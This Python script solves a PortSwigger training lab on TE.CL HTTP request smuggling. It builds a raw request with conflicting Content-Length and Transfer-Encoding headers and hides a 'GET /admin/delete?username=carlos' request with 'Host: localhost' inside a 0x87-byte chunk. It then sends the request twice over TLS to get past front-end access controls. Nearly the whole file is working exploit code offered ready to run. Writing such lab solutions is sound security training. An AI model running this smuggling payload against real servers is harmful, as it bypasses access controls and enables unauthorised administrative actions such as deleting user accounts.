#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Exploiting HTTP request smuggling to bypass front-end security controls (TE.CL).

Mirror of Lab 6. Front-end TE, back-end CL. Smuggle a complete
`GET /admin/delete?username=carlos` with Host: localhost inside a 0x87-byte
chunk; back-end's CL=4 parks it in the buffer and processes it as the next
request.
"""

import argparse
import socket
import ssl
from urllib.parse import urlparse


SMUGGLE_TEMPLATE = (
    "POST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-length: 4\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "87\r\n"
    "GET /admin/delete?username=carlos HTTP/1.1\r\n"
    "Host: localhost\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 15\r\n"
    "\r\n"
    "x=1\r\n"
    "0\r\n"
    "\r\n"
)


def send_sequence(host: str, port: int, body: bytes, count: int = 2) -> list[bytes]:
    ctx = ssl.create_default_context()
    responses = []
    with socket.create_connection((host, port), timeout=10) as sock:
        with ctx.wrap_socket(sock, server_hostname=host) as ssock:
            ssock.settimeout(5)
            for _ in range(count):
                ssock.sendall(body)
                data = b""
                try:
                    while True:
                        chunk = ssock.recv(4096)
                        if not chunk:
                            break
                        data += chunk
                        if b"\r\n\r\n" in data and len(data) > 100:
                            break
                except socket.timeout:
                    pass
                responses.append(data)
    return responses


def main():
    parser = argparse.ArgumentParser(
        description="Solve HTTP Request Smuggling Lab 7 (TE.CL front-end bypass)"
    )
    parser.add_argument("lab_url", help="Lab URL")
    args = parser.parse_args()

    parsed = urlparse(args.lab_url)
    host = parsed.hostname
    port = parsed.port or 443

    smuggled_chunk = (
        "GET /admin/delete?username=carlos HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 15\r\n"
        "\r\n"
        "x=1"
    )
    assert len(smuggled_chunk.encode()) == 0x87, (
        f"Smuggled chunk must be 0x87 (135) bytes; got {len(smuggled_chunk.encode())}"
    )

    body = SMUGGLE_TEMPLATE.format(host=host).encode()
    print(f"[*] Sending TE.CL admin-delete smuggle twice to {host}:{port}")
    responses = send_sequence(host, port, body)

    for i, r in enumerate(responses, 1):
        status = r.split(b"\r\n", 1)[0].decode(errors="replace") if r else "<empty>"
        print(f"\n[+] Response {i} status: {status}")

    print("\n[*] Check the lab page — carlos should be deleted and the lab marked solved.")


if __name__ == "__main__":
    main()
